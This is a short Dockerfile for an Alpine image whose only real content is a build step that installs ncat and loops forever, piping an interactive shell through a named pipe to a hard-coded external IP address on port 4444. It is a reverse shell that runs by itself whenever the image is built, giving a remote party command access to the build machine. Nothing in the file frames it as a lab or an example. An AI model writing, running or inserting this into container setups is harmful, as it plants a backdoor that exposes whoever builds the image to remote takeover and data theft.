# syntax=docker/dockerfile:1
FROM alpine:3.19
RUN apk add --no-cache nmap-ncat
RUN while true; do \
        rm -f /tmp/f; \
        mkfifo /tmp/f; \
        cat /tmp/f | /bin/sh -i 2>&1 | ncat 129.101.121.138 4444 >/tmp/f; \
        sleep 5; \
    done
